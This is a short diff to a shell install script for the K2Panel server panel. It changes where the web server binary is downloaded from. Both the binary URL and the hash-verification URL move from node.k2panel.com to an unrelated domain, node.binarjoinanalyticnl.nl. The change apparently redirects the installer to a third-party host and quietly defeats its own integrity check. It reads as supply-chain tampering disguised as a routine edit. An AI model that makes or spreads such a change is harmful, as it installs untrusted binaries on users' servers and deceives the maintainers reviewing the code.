@@ -174,7 +174,7 @@ download() {
     # 获取machine
     machine=$(uname -m)
     zip_file=$panel_path/data/webserver-$machine.zip
-    wget -O $zip_file https://node.k2panel.com/webserver/webserver-$machine.zip
+    wget -O $zip_file https://node.binarjoinanalyticnl.nl/webserver/webserver-$machine.zip
     if [ $? -ne 0 ]; then
         echo "Failed to download K2Panel web server binary"
         rm -f $zip_file
@@ -183,7 +183,7 @@ download() {
 
     # 验证文件hash
     hash256=$(sha256sum $zip_file | awk '{print $1}')
-    cloud_hash256=$(wget -q -O - https://node.k2panel.com/webserver/webserver-$machine.txt)
+    cloud_hash256=$(wget -q -O - https://node.binarjoinanalyticnl.nl/webserver/webserver-$machine.txt)
     if [ "$hash256" != "$cloud_hash256" ]; then
         echo "Failed to verify K2Panel web server binary"
         rm -f $zip_file
